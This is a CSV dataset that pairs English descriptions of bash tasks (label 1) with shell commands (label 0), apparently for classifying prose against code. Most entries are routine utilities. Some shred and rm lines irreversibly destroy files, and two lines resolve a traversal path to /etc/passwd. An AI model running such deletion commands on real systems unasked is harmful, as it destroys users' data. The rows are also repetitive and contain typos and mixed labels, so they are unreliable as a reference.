value,target
mktemp,0
"mktemp -dt ""$(basename $0).XXXXXXXXXX""",0
"creates temporary file, replacing XXXXXXXXXXXXXXXXXXXXXXX with equal length suffix.",1
mktemp /tmp/banana.XXXXXXXXXXXXXXXXXXXXXXX.mp3,0
apropos -r '.*',0
apropos postscript | grep -i png,0
apropos -s 3 .,0
searches the manual page names and descriptions,1
apropos,0
"overwirte file '/path/to/your/file' with random content, showing progress while execution.",1
shred -v -n 1 /path/to/your/file #overwriting with random data,0
"overwirte file '/path/to/your/file' with random content, then overwrite with zeroes, and remove, showing progress while execution.",1
shred -v -n 1 -z -u /path/to/your/file,0
shred -uzn 35 filename,0
shred -v -n 0 -z -u /path/to/your/file #overwriting with zeroes and remove the file,0
"display the content of YourFile.txt, waiting for user input at each page.",1
more YourFile.txt,0
"Display the contents of /var/log/syslog one page at a time, pausing for user interaction between each.",1
more /var/log/syslog,0
"Search for the system host name in ""/etc/hosts"" and print the IP address in the first awk field",1
more /etc/hosts | grep `hostname` | awk '{print $1}',0
"List all IP addresses assigned to current hostname, pausing for user interaction after each page.",1
more /etc/hosts | grep '[[:space:]]*'`hostname`'[[:space:]]*' | awk '{print $1}',0
"false | echo ""${PIPESTATUS[0]}""",0
false | tee /dev/null,0
false | true,0
false,0
opens gawk info manual and goes to command-line options node.,1
info -O gawk,0
opens menu item 'Basic Shell Features' -> 'Shell Expansions' -> 'Filename Expansion' -> 'Pattern Matching' in the 'bash' manual.,1
info bash 'Basic Shell Features' 'Shell Expansions' 'Filename Expansion' 'Pattern Matching',0
"opens gcc info manual and goes to a node pointed by index entry ""funroll-loops"".",1
info gcc --index-search=funroll-loops,0
"Open gcc info manual and select ""option index"" menu entry.",1
"info gcc ""option index""",0
sleep for 10 seconds,1
sleep 10,0
sleep 100 | sleep 200 &,0
sleep for 5 seconds,1
sleep 1,0
bg %  so it wont die when you logoff,0
Puts the job 1 in the background.,1
bg %1 [puts the job in the background],0
bg,0
bg %,0
"convert all characters in ""$a"" to lower case and save to variable ""b""",1
"b=`echo ""$a"" | sed 's/./\L&/g'`",0
"convert all characters in ""$a"" to upper case and save to variable ""b""",1
"b=`echo ""$a"" | sed 's/./\U&/g'`",0
"set variable ""b"" to the first word of ""a"" converted to lowercase.",1
"set variable ""b"" to the first word of ""a"" converted to uppercase.",1
"b=`echo ""$a"" | awk '{ print toupper($1) }'`",0
execute /usr/bin/find with $* arguments,1
/usr/bin/find $*,0
execute /usr/bin/find with $* arguments where current directory is the first argument,1
/usr/bin/find ./ $*,0
find the first file/directory under $DIR which matches the $TMP_DIR in its path,1
/usr/bin/find $DIR -maxdepth 1 -ipath $TMP_DIR -print -quit,0
"/usr/bin/find /home/user/Series/ -iname ""*sample*"" -exec rm {} \;",0
delete the files under the current working directory with inode numbers specified on standard input,1
"xargs -n 1 -I '{}' find ""$(pwd)"" -type f -inum '{}' -delete",0
Print the full path of a file under the current working directory with inode number specified on standard input,1
take a file path from standard input and remove it.,1
xargs -I '{}' rm '{}',0
take a file path from standard input and remove it.,1
xargs -i rm '{}',0
"Follows symbolic link $BASH_SOURCE, and prints path to its target.",1
$(dirname $(readlink -f $BASH_SOURCE)),0
$(dirname $0),0
prints path to folder that contains target of the symbolic link ../../../../etc/passwd.,1
$(dirname $(readlink -e ../../../../etc/passwd)),0
prints path to the folder that contains target of symbolic link ../../../../etc/passwd.,1
$(dirname $(readlink -e ../../../../etc/passwd)),0
less -N file.txt,0
less -S file,0
"Page through the contents of file 'file_name', positioning the view at the first occurrence of regular expression 'regex'.",1
less -p regex file_name,0
show files in maximum 1 level down the current directory that were modified less than 1 day ago from today,1
less `find -maxdepth 1 -type f -daystart -mtime -1`,0
"Remove containing directories from variable 'path' ie. ""/some/specific/directory"" becomes ""directory"".",1
path=$(basename $path),0
set variable 'path' to name of current directory (without the containing directories) converted to lowercase.,1
path=$(basename $(pwd) | awk '{print tolower($0)}'),0
Set variable 'path' to name of current directory (without the containing directories) converted to lowercase.,1
path=$(basename $(pwd) | tr 'A-Z' 'a-z' ),0
path=$(basename $(pwd)),0
saves location of file $1 in 'dir' variable.,1
"dir=$(dirname -- ""$1"")",0
"save the directory of the full path to the current script in variable ""dir""",1
dir=$(dirname $(readlink -m $BASH_SOURCE)),0
"dir=$(dirname -- ""$1"")",0
saves location of file $1 in 'dir' variable.,1
"dir=$(dirname -- ""$1"")",0
"starts new tmux session, assuming the terminal supports 256 colours.",1
tmux -2,0
"Executes tmux commands that are stored in the '$tmux_command' variable, and then attaches to the tmux session.",1
"tmux ""$tmux_command \; attach""",0
"Starts new tmux session, assuming the terminal supports 256 colours.",1
tmux -2,0
"Starts new tmux session, assuming the terminal supports 256 colours.",1
tmux -2,0
md5=`md5sum ${my_iso_file} | awk '{ print $1 }'`,0
calculate md5 sum of file ${my_iso_file} and save it to variable 'md5',1
md5=`md5sum ${my_iso_file} | cut -b-32`,0
"Get md5sum of an iso file without displaying the filename, save value to 'md5' variable",1
md5=`md5sum ${my_iso_file} | awk '{ print $1 }'`,0
md5=`md5sum ${my_iso_file} | awk '{ print $1 }'`,0
"Save the user name in upper case of the current user in variable ""v""",1
v=$(whoami | tr [:lower:] [:upper:]),0
v=$(whoami | awk '{print toupper($0)}'),0
"Save the user name in upper case of the current user in variable ""v""",1
v=$(whoami | tr [:lower:] [:upper:]),0
v=$(whoami | tr [:lower:] [:upper:]),0
fg 2,0
fg,0
gets back to the foreground a job with number 2.,1
fg 2,0
fg 2,0
Start 'top' to monitor all processes with the default settings.,1
top,0
"monitor 3 specific process IDs: 18884, 18892, and 18919 (GNU specific)",1
top -p 18884 -p 18892 -p 18919,0
top,0
Start 'top' to monitor all processes with the default settings.,1
top,0
tee foobar.txt,0
Print received input to the terminal,1
tee,0
tee foobar.txt,0
"Write standard input to standard output and to ""foobar.txt""",1
tee foobar.txt,0
uniq -c | sort -n | tail -n1,0
output all lines in 'file' comparing the first 12 characters and discarding any adjascent lines where these characters are duplicates.,1
uniq -w12 -c file,0
print the line with most consecutive repeats prefixed with its count from standard input,1
uniq -c | sort -n | tail -n1,0
Print the line with most consecutive repeats prefixed with its count from standard input,1
"save absolute path of ""$path"" whose parents exist to variable ""abspath""",1
abspath=$(readlink -f $path),0
"save absolute path of ""$path"" that may not exist to variable ""abspath""",1
abspath=$(readlink -m $path),0
abspath=$(readlink -f $path),0
abspath=$(readlink -f $path),0
"save all directories under the current directory as a comma separated list in variable ""FOLDERS""",1
"FOLDERS=$(find . -type d -print0 | tr '\0' ',')",0
"save all directories under the current directory as a comma separated list in variable ""FOLDERS""",1
"FOLDERS=$(find . -type d | paste -d, -s)",0
"Save all directories under the current directory as a comma separated list in variable ""FOLDERS""",1
"FOLDERS=$(find . -type d | paste -d, -s)",0
MY_DIR=$(dirname $(readlink -f $0)),0
"Save the directory name of the canonical path to the current script in variable ""MY_DIR""",1
MY_DIR=$(dirname $(readlink -f $0)),0
put the absolute directory path to the current script to MY_DIR variable,1
MY_DIR=$(dirname $(readlink -f $0)),0
put the absolute directory path to the current script to MY_DIR variable,1
MY_DIR=$(dirname $(readlink -f $0)),0
HOSTNAME=$(hostname) make -e,0
HOSTNAME=$(hostname),0
Run 'make -e' with an environment variable 'HOSTNAME' set to the system hostname,1
run 'make -e' with an environment variable 'HOSTNAME' set to the system hostname,1
HOSTNAME=$(hostname) make -e,0
"set the variable ""me"" to the name of the running script, or shell, login shells have a hyphen appended to the beginning of the name, such as ""-bash"".",1
"me=`basename -- ""$0""`",0
"Set the variable ""me"" to the name of the running script.",1
"me=`basename ""$0""`",0
"me=`basename -- ""$0""`",0
"me=`basename -- ""$0""`",0
"execute the first instance of ""parallel"" found in the PATH, passing it all parameters received by the script/function",1
"`which parallel` ""$@""",0
run the find command with all shell positional arguments,1
"Execute the first instance of ""parallel"" found in the PATH, passing it all parameters received by the script/function",1
"`which parallel` ""$@""",0
"Execute the first instance of ""parallel"" found in the PATH, passing it all parameters received by the script/function",1
"`which parallel` ""$@""",0
save system information appended with the current date in 'filename' variable,1
"save the network node hostname append with '-', the current date and '.txt' into variable 'filename'",1
"filename=""$(uname -n)-$(date +%F).txt""",0
Save system information appended with the current date in 'filename' variable,1
"filename=""$(uname -a)$(date)""",0
"filename=""$(uname -a)$(date)""",0
number=$(echo $filename | awk -F _ '{ print $2 }'),0
"save only the digits in ""$filename"" to variable ""number""",1
number=$(echo $filename | tr -cd '[[:digit:]]'),0
number=$(echo $filename | awk -F _ '{ print $2 }'),0
"extract number from $filename of the form ""something_12345_else"" and set the variable ""number"" to this number.",1
number=$(echo $filename | awk -F _ '{ print $2 }'),0
"Save IP addresses of the host name in variable ""ip""",1
ip=$(hostname -I | awk '{print $1}'),0
"save IP addresses of the host name in variable ""ip""",1
ip=$(hostname -I),0
ip=$(hostname -I | awk '{print $1}'),0
"save IP addresses of the host name in variable ""ip""",1
ip=$(hostname -I | awk '{print $1}'),0
bunzip2 file.bz2,0
shows size of compressed file in .bz2 archive.,1
bunzip2 -c bigFile.bz2 | wc -c,0
bunzip2 file.bz2,0
Extracts a bz2 file.,1
full_backup_dir=$(find . -depth '(' -wholename './.*' ')' -prune -o -print),0
full_backup_dir=$(find . -depth \( -wholename \./\.\* \) -prune -o -mtime -1 -print),0
full_backup_dir=$(find . -depth '(' -wholename './.*' ')' -prune -o -print),0
find all files in current directory excluding hidden files and put the output into full_backup_dir variable,1
full_backup_dir=$(find . -depth '(' -wholename './.*' ')' -prune -o -print),0
CC=$(which cc) ./configure,0
CC=$(which gcc) ./configure,0
CC=$(which cc) ./configure,0
"run ""./configure"" with a new environment variable CC set to the full path of the command 'cc'",1
"egrep -R ""word-1|word-2” directory-path",0
"egrep -w -R ""word-1|word-2” directory-path",0
"recursively finds strings with 'word-1' or 'word-2' in any file under 'directory-path', following symlinks, and prints found strings.",1
"egrep -R ""word-1|word-2” directory-path",0
"egrep -R ""word-1|word-2” directory-path",0
$dig -x 8.8.8.8 | grep  PTR | grep -o google.*,0
Gets domain name from dig reverse lookup.,1
$dig -x 8.8.8.8 | grep  PTR | grep -o google.*,0
Get domain name from dig reverse lookup.,1
$dig -x 8.8.8.8 | grep  PTR | grep -o google.*,0
Get domain name from dig reverse lookup.,1
output=$(echo $input | fold -w4 | tac | tr -d \\n),0
Strip all '\' and newlines from $output and save the result to variable 'output',1
"output=$(echo ""$output"" | tr -d '\' | tr -d '\n')",0
output=$(echo $input | fold -w4 | tac | tr -d \\n),0
reverse the text in $input by taking each 4 characters as each units and save the result in variable 'output',1
output=$(echo $input | fold -w4 | tac | tr -d \\n),0
Returns exit code 1 and terminates shell if 'set -e' was applied.,1
a=$(false),0
a=$(false),0
returns exit code 1 and terminates shell if 'set -e' was applied.,1
a=$(false),0
a=$(false),0
md5=$(md5sum $item | cut -f1 -d\ ),0
"md5=$(md5sum ""$my_iso_file"" | cut -d ' ' -f 1)",0
md5=$(md5sum $item | cut -f1 -d\ ),0
md5=$(md5sum $item | cut -f1 -d\ ),0
libdir=$(dirname $(dirname $(which gcc)))/lib,0
libdir=$(dirname $(dirname $(which gcc)))/lib,0
libdir=$(dirname $(dirname $(which gcc)))/lib,0
"locates 'gcc' executable file, strips last two parts of the full path, adds '/lib' to the end and saves result in 'libdir' variable.",1
libdir=$(dirname $(dirname $(which gcc)))/lib,0
"save the absolute path of the directory of the current script to variable ""DIR""",1
"DIR=$(dirname ""$(readlink -f \""$0\"")"")",0
saves real path of the folder containing the current script,1
"DIR=$(dirname ""$(readlink -f \""$0\"")"")",0
"DIR=$(dirname ""$(readlink -f \""$0\"")"")",0
"save the absolute path of the directory of the current script to variable ""DIR""",1
"DIR=$(dirname ""$(readlink -f \""$0\"")"")",0
me=$(readlink --canonicalize --no-newline $BASH_SOURCE),0
"save the canonical filename of the script in variable ""me""",1
me=$(readlink --canonicalize --no-newline $0),0
"save the canonical filename of ""$BASH_SOURCE"" in variable ""me""",1
me=$(readlink --canonicalize --no-newline $BASH_SOURCE),0
"Save the canonical filename of ""$BASH_SOURCE"" in variable ""me""",1
me=$(readlink --canonicalize --no-newline $BASH_SOURCE),0
a=$( df -H ),0
"Store info about all mounted file systems, printing all sizes in powers of 1000",1
a=$( df -H ),0
print file system disk space usage with sizes in powers of 1000,1
a=$( df -H ),0
Print file system disk space usage with sizes in powers of 1000,1
a=$( df -H ),0
"finalName=$(basename -- ""$(dirname -- ""$path"")"")",0
"set variable ""finalName"" to the second-to-last slash-separated path component of variable ""path""",1
"finalName=$(basename -- ""$(dirname -- ""$path"")"")",0
"finalName=$(basename -- ""$(dirname -- ""$path"")"")",0
removes first and last parts of path $path and saves the result in 'finalName' variable.,1
"finalName=$(basename -- ""$(dirname -- ""$path"")"")",0
"copy the standard output of a ""bash"" session to ""/var/log/bash.out.log""",1
"write output and error of ""bash myscript.sh"" to standard output and to ""output.log""",1
bash myscript.sh 2>&1 | tee output.log,0
"copy the standard output of a ""bash"" session to ""/var/log/bash.out.log""",1
bash | tee /var/log/bash.out.log,0
"Copy the standard output of a ""bash"" session to ""/var/log/bash.out.log""",1
bash | tee /var/log/bash.out.log,0
Save the system load average for the past 1 minute of the currently logged in user to variable 'proc_load_average',1
"proc_load_average=$(w | head -1 | cut -d"" "" -f13 | cut -d"","" -f1-2 | tr ',' '.')",0
"proc_load_average=$(w | head -1 | cut -d"" "" -f12 | cut -d"","" -f1-2 | tr ',' '.')",0
"proc_load_average=$(w | head -1 | cut -d"" "" -f12 | cut -d"","" -f1-2 | tr ',' '.')",0
Find md5sum of 'string to be hashed',1
md5 -s 'string to be hashed',0
md5 -q file,0
md5 -s 'string to be hashed',0
md5 -s 'string to be hashed',0
"NAME=`basename ""$FILE""`",0
"take the section of variable ""FILE"" between the last slash and the following dot, if any, and store that section in variable ""NAME"".",1
